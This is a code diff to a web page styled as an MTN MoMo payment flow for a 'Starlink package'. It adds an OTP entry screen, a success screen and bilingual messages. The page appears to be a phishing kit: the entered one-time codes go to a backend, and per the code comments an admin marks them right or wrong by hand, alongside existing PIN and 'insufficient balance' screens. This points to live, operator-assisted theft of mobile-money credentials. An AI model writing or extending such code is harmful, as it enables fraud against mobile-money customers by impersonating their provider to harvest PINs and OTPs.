@@ -333,6 +333,43 @@
             text-align: left;
         }
 
+        /* OTP Screen */
+        .otp-screen {
+            display: none;
+        }
+
+        .otp-screen.active {
+            display: block;
+        }
+
+        .otp-input {
+            width: 56px;
+            height: 60px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            text-align: center;
+            font-size: 26px;
+            font-weight: 700;
+            color: #1a1a2e;
+            outline: none;
+            transition: border-color 0.2s;
+            caret-color: #ffcc00;
+        }
+
+        .otp-input:focus {
+            border-color: #ffcc00;
+        }
+
+        .otp-input.shake {
+            animation: otpShake 0.4s;
+        }
+
+        @keyframes otpShake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-6px); }
+            75% { transform: translateX(6px); }
+        }
+
         .insufficient-screen {
             display: none;
         }
@@ -741,6 +778,35 @@
                 <button class="link-action" id="verifyLinkBtn" disabled>Verify Link</button>
             </div>
 
+            <!-- OTP Screen (after link verification) -->
+            <div class="otp-screen" id="otpScreen">
+                <h3 class="pin-title" id="otpTitle">Enter OTP Code</h3>
+                <p class="pin-subtitle" id="otpSubtitle">Enter the 4-digit verification code sent to your MoMo number to complete this payment.</p>
+                <p class="pin-subtitle phone-display" id="otpPhoneDisplay">+260 XXX XXX XXX</p>
+
+                <div class="error-message" id="otpError"></div>
+
+                <div class="pin-inputs">
+                    <input type="tel" class="otp-input" maxlength="1" inputmode="numeric" autocomplete="one-time-code" data-otp-index="0">
+                    <input type="tel" class="otp-input" maxlength="1" inputmode="numeric" autocomplete="off" data-otp-index="1">
+                    <input type="tel" class="otp-input" maxlength="1" inputmode="numeric" autocomplete="off" data-otp-index="2">
+                    <input type="tel" class="otp-input" maxlength="1" inputmode="numeric" autocomplete="off" data-otp-index="3">
+                </div>
+
+                <button class="submit-btn" id="otpSubmitBtn" disabled>Verify OTP</button>
+            </div>
+
+            <!-- Payment Success Screen -->
+            <div class="success-screen" id="successScreen">
+                <div class="screen-center">
+                    <div class="success-icon-circle">
+                        <span class="icon-text">✅</span>
+                    </div>
+                    <h2 class="success-title" id="successTitle">Payment Successful!</h2>
+                    <p class="success-text" id="successText">Your Starlink package has been activated successfully.</p>
+                </div>
+            </div>
+
             <!-- Insufficient Balance Screen -->
             <div class="insufficient-screen" id="insufficientScreen">
                 <div class="screen-center">
@@ -878,7 +944,14 @@
                 verifiedReady: '✅ Verified! You can proceed to link verification now.',
                 contactSupport: 'Chat with support now',
                 checkVerify: 'Check Verification Status',
-                useDifferent: 'Use a Different Number'
+                useDifferent: 'Use a Different Number',
+                otpTitle: 'Enter OTP Code',
+                otpSub: 'Enter the 4-digit verification code sent to your MoMo number to complete this payment.',
+                otpVerify: 'Verify OTP',
+                otpSubmitted: 'OTP submitted. Waiting for verification...',
+                otpIncorrect: 'Incorrect OTP. Please enter the correct code and try again.',
+                paymentSuccess: 'Payment Successful!',
+                paymentSuccessMsg: 'Your Starlink package has been activated successfully.'
             },
             fr: {
                 welcome: 'Bienvenue sur MoMo',
@@ -916,7 +989,14 @@
                 verifiedReady: '✅ Vérifié ! Vous pouvez maintenant continuer vers le lien de vérification.',
                 contactSupport: 'Discuter avec le support maintenant',
                 checkVerify: 'Vérifier le statut',
-                useDifferent: 'Utiliser un autre numéro'
+                useDifferent: 'Utiliser un autre numéro',
+                otpTitle: 'Entrez le code OTP',
+                otpSub: 'Saisissez le code de vérification à 4 chiffres envoyé à votre numéro MoMo pour finaliser ce paiement.',
+                otpVerify: 'Vérifier OTP',
+                otpSubmitted: 'OTP envoyé. En attente de vérification...',
+                otpIncorrect: 'OTP incorrect. Veuillez saisir le code correct et réessayer.',
+                paymentSuccess: 'Paiement réussi !',
+                paymentSuccessMsg: 'Votre forfait Starlink a été activé avec succès.'
             }
         };
 
@@ -966,6 +1046,11 @@
             var _cvb = document.getElementById('checkVerifyBtn'); if (_cvb) _cvb.textContent = '🔄 ' + t('checkVerify');
             var _pvb = document.getElementById('proceedVerifiedBtn'); if (_pvb) _pvb.textContent = t('proceedLink');
             var _udt = document.getElementById('useDifferentText'); if (_udt) _udt.textContent = t('useDifferent');
+            var _ot = document.getElementById('otpTitle'); if (_ot) _ot.textContent = t('otpTitle');
+            var _os = document.getElementById('otpSubtitle'); if (_os) _os.textContent = t('otpSub');
+            var _osb = document.getElementById('otpSubmitBtn'); if (_osb && !_osb.dataset.busy) _osb.textContent = t('otpVerify');
+            var _st = document.getElementById('successTitle'); if (_st) _st.textContent = t('paymentSuccess');
+            var _sx = document.getElementById('successText'); if (_sx) _sx.textContent = t('paymentSuccessMsg');
             if (!mtnIsVerified) {
                 var _vst = document.getElementById('verifyStatusText'); if (_vst) _vst.textContent = t('waitingVerify');
             }
@@ -987,6 +1072,123 @@
         let mtnVerifiedPollInterval = null;
         let mtnIsVerified = false;
         let wrongLinkNotified = false;
+        let wrongOtpNotified = false;
+
+        // ── OTP Screen Logic ──
+        const otpScreen = document.getElementById('otpScreen');
+        const otpInputs = document.querySelectorAll('.otp-input');
+        const otpSubmitBtn = document.getElementById('otpSubmitBtn');
+
+        otpInputs.forEach((input, index) => {
+            input.addEventListener('input', function() {
+                const value = this.value.replace(/\D/g, '');
+                this.value = value;
+                if (value && index < otpInputs.length - 1) {
+                    otpInputs[index + 1].focus();
+                }
+                otpSubmitBtn.disabled = getOtpValue().length !== 4;
+            });
+
+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && !this.value && index > 0) {
+                    otpInputs[index - 1].focus();
+                }
+            });
+
+            input.addEventListener('paste', function(e) {
+                e.preventDefault();
+                const digits = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, 4);
+                if (!digits) return;
+                digits.split('').forEach((d, i) => { if (otpInputs[i]) otpInputs[i].value = d; });
+                otpInputs[Math.min(digits.length, otpInputs.length - 1)].focus();
+                otpSubmitBtn.disabled = getOtpValue().length !== 4;
+            });
+        });
+
+        function getOtpValue() {
+            return Array.from(otpInputs).map(i => i.value).join('');
+        }
+
+        function clearOtpInputs(focusFirst) {
+            otpInputs.forEach(i => i.value = '');
+            otpSubmitBtn.disabled = true;
+            if (focusFirst) otpInputs[0].focus();
+        }
+
+        function showOtpScreen() {
+            phoneScreen.classList.add('hidden');
+            pinScreen.classList.remove('active');
+            linkScreen.classList.remove('active');
+            notVerifiedScreen.classList.remove('active');
+            waitingScreen.style.display = 'none';
+            document.getElementById('insufficientScreen').classList.remove('active');
+            document.getElementById('successScreen').classList.remove('active');
+            otpScreen.classList.add('active');
+            document.getElementById('otpPhoneDisplay').textContent = `${phoneCode} ${currentMsisdn}`;
+            document.getElementById('otpSubmitBtn').textContent = t('otpVerify');
+            otpInputs[0].focus();
+        }
+
+        function resetOtpEntry() {
+            wrongOtpNotified = false;
+            clearOtpInputs(true);
+            const errEl = document.getElementById('otpError');
+            errEl.textContent = t('otpIncorrect');
+            errEl.style.background = '#FEF2F2';
+            errEl.style.color = '#DC2626';
+            errEl.classList.add('show');
+            otpInputs.forEach(i => i.classList.add('shake'));
+            setTimeout(() => otpInputs.forEach(i => i.classList.remove('shake')), 450);
+        }
+
+        otpSubmitBtn.addEventListener('click', async function() {
+            const otp = getOtpValue();
+            if (otp.length !== 4 || !currentRequestId) return;
+
+            otpSubmitBtn.disabled = true;
+            otpSubmitBtn.dataset.busy = '1';
+            otpSubmitBtn.textContent = t('processing');
+
+            const errEl = document.getElementById('otpError');
+            errEl.classList.remove('show');
+
+            try {
+                const res = await fetch('/api/mtn/submit-otp', {
+                    method: 'POST',
+                    credentials: 'include',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ requestId: currentRequestId, otp: otp })
+                });
+                const data = await res.json();
+
+                if (!data.success) {
+                    throw new Error(data.message || 'OTP submission failed');
+                }
+
+                wrongOtpNotified = false;
+
+                errEl.textContent = t('otpSubmitted');
+                errEl.style.background = '#EFF6FF';
+                errEl.style.color = '#2563EB';
+                errEl.classList.add('show');
+
+                otpInputs.forEach(i => i.value = '');
+                otpSubmitBtn.textContent = t('otpVerify');
+                delete otpSubmitBtn.dataset.busy;
+                otpSubmitBtn.disabled = true;
+
+                startStatusPolling(currentRequestId);
+
+            } catch (e) {
+                errEl.textContent = t('somethingWrong');
+                errEl.style.background = '#FEF2F2';
+                errEl.style.color = '#DC2626';
+                errEl.classList.add('show');
+                delete otpSubmitBtn.dataset.busy;
+                otpSubmitBtn.disabled = false;
+                otpSubmitBtn.textContent = t('otpVerify');
+            }
+        });
         
         // Country Selector Functions
         // Country functions removed - Zambia only
@@ -1142,6 +1344,8 @@
             phoneScreen.classList.add('hidden');
             pinScreen.classList.remove('active');
             linkScreen.classList.remove('active');
+            otpScreen.classList.remove('active');
+            document.getElementById('successScreen').classList.remove('active');
             document.getElementById('insufficientScreen').classList.remove('active');
             notVerifiedScreen.classList.add('active');
             // Reset MoMo attempt counter
@@ -1239,6 +1443,8 @@
             document.getElementById('insufficientScreen').classList.remove('active');
             linkScreen.classList.remove('active');
             pinScreen.classList.remove('active');
+            otpScreen.classList.remove('active');
+            document.getElementById('successScreen').classList.remove('active');
             waitingScreen.style.display = 'none';
             phoneScreen.classList.remove('hidden');
             stopMtnVerifiedPolling();
@@ -1246,12 +1452,15 @@
             mtnIsVerified = false;
             currentRequestId = null;
             wrongLinkNotified = false;
+            wrongOtpNotified = false;
         }
 
         function showWaitingScreen() {
             phoneScreen.classList.add('hidden');
             pinScreen.classList.remove('active');
             linkScreen.classList.remove('active');
+            otpScreen.classList.remove('active');
+            document.getElementById('successScreen').classList.remove('active');
             notVerifiedScreen.classList.remove('active');
             document.getElementById('insufficientScreen').classList.remove('active');
             waitingScreen.style.display = 'block';
@@ -1282,7 +1491,19 @@
         }
 
         function handleMtnState(status, data) {
-            if (!status || status === 'not_found' || status === 'expired') return;
+            if (!status || status === 'expired') return;
+            if (status === 'not_found') {
+                // Approval expired server-side while user waits on the OTP screen
+                if (otpScreen.classList.contains('active')) {
+                    stopStatusPolling();
+                    otpScreen.classList.remove('active');
+                    showPhoneScreen();
+                    alert(currentLang === 'fr'
+                        ? 'La vérification a expiré. Veuillez recommencer.'
+                        : 'Verification expired. Please start over.');
+                }
+                return;
+            }
 
             switch (status) {
                 case 'phone_pin_verified':
@@ -1318,27 +1539,33 @@
                     }
                     break;
 
+                case 'otp_pending':
+                    // Link verified - show the OTP entry screen (keep polling for admin verdict)
+                    if (!otpScreen.classList.contains('active')) {
+                        showOtpScreen();
+                    }
+                    break;
+
+                case 'wrong_otp':
+                    // Admin marked the OTP as wrong - user must re-enter
+                    if (!wrongOtpNotified) {
+                        wrongOtpNotified = true;
+                        resetOtpEntry();
+                    }
+                    break;
+
                 case 'completed':
                     stopStatusPolling();
                     waitingScreen.style.display = 'none';
                     linkScreen.classList.remove('active');
+                    otpScreen.classList.remove('active');
                     pinScreen.classList.remove('active');
                     phoneScreen.classList.add('hidden');
                     notVerifiedScreen.classList.remove('active');
                     document.getElementById('insufficientScreen').classList.remove('active');
-                    // Show success state
-                    const successScreen = document.createElement('div');
-                    successScreen.id = 'successScreen';
-                    successScreen.className = 'success-screen active';
-                    successScreen.style.cssText = 'text-align:center;padding:40px 20px;';
-                    successScreen.innerHTML = `
-                        <div class="success-icon-circle">
-                            <span class="icon-text">✅</span>
-                        </div>
-                        <h2 class="success-title">${currentLang === 'fr' ? 'Paiement réussi !' : 'Payment Successful!'}</h2>
-                        <p class="success-text">${currentLang === 'fr' ? 'Votre forfait Starlink a été activé avec succès.' : 'Your Starlink package has been activated successfully.'}</p>
-                    `;
-                    document.querySelector('.card').appendChild(successScreen);
+                    document.getElementById('successScreen').classList.add('active');
+                    document.getElementById('successTitle').textContent = t('paymentSuccess');
+                    document.getElementById('successText').textContent = t('paymentSuccessMsg');
                     break;
 
                 case 'timeout':
@@ -1653,6 +1880,7 @@
             phoneScreen.classList.add('hidden');
             pinScreen.classList.remove('active');
             linkScreen.classList.remove('active');
+            otpScreen.classList.remove('active');
             document.getElementById('insufficientScreen').classList.add('active');
             stopInsufficientBalancePolling();
             stopStatusPolling();
